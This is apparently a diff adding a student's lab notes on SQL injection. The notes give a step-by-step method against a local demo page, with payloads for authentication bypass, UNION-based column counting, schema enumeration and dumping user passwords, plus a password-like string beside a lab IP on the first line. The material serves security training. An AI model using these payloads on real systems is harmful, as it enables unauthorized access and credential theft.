@@ -1,2 +1,87 @@
           lvaZsAC2R0TC, 10.50.15.162
 
+Basic SQL Commands:
+          https://sec-cted-tech-college-cttsb-cctc-sec-12e0e75a1babbeec38083447b9.cybbh.io/05_SQL_Injection.html#what-is-sql:~:text=of%20another%20table.-,Basic%20SQL%20Commands,-Command
+
+SQL Practice Activity:
+         https://sqlbolt.com/
+
+DEFAULT DATABASE: (Looking for non-default)
+          MySql
+          Information_schema
+          Performance_schema
+
+Unsanatized: input fields can be found using a single quote -> '
+
+!!!!!!!!!!!DEMOOOOOO!!!!!!!!!!!!
+
+ssh -MS
+ssh
+
+mysql
+#ACCESS MYSQL FROM THE SQL SERVER
+          show databases; (dont look at defualts)
+          show tables from session;
+          select * from session.car; (database.table)
+          use session; (moves us into database)
+          show tables;
+          select * from car; (getting all from car table)
+#UNION SELECT
+          select * from Tires;
+          select * from car UNION select tireid,name,size,cost,1,2 FROM Tires; (must match amout of colomns in first table, 1&2 are filler)
+
+# TRUTH STATEMENTS
+          select * from user;
+          select * from user where name= 'admin' OR 1=1;
+
+
+#SQLI
+          tom ' OR 1='1          (use for password and username)
+#GET (URL) METHOD
+
+
+#investigation
+          127.0.0.1:8888/uniondemo.php?selection1-*
+#CHECK FOR VULNERABILITIES
+          127.0.0.1:8888/uniondemo.php?selection1-* OR 1=1 (truth statement)
+          //Selection=2 dumped the whole table
+(step through til no error)
+           127.0.0.1:8888/uniondemo.php?selection=2 UNION SELECT 1
+           127.0.0.1:8888/uniondemo.php?selection=2 UNION SELECT 1,2
+           127.0.0.1:8888/uniondemo.php?selection=2 UNION SELECT 1,2,3 #THIS WORKED, 3 COLOMNS
+           127.0.0.1:8888/uniondemo.php?selection=2 UNION SELECT 1,2,3,4
+
+#GOLDEN STATEMENT
+          UNION SELECT table_schema,Table_name,column_name (,placeholders if needed) From information-schema.columns;
+          127.0.0.1:8888/uniondemo.php?selection=2 UNION SELECT table_schema,Table_name,column_name (,placeholders if needed) From information_schema.columns;  
+#CRAFT QUERY
+          127.0.0.1:8888/uniondemo.php?selection=2 UNION SELECT id,name,pass FROM session.user;
+
+#SQLI STEPS
+          1. Identify vulnerale field --      ...php?Selection=1 OR 1=1
+          2. Idnetify number of columns --    UNION SELECT 1,2,3
+          3. Edit Golden Statemen to match the number of columns
+                  UNION SELECT table_schema,Table_name,column_name (,placeholders if needed) From information-schema.columns;
+          4. Craft queries
+                    UNION SELECT <COLUMN_NAME>,<COLUMN_NAME>,<COLUMN_NAME>,<PLACEHOLDER> From <DATABASE>.<TABLE>
+
+##POST METHOD
+          ' OR 1='1
+          ' UNION SELECT 1,2,3,4
+          ' UNION SELECT table_schema,Table_name,column_name (,placeholders if needed) From information-schema.columns;
+          ' UNION SELECT id,name,pass FROM session.user
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
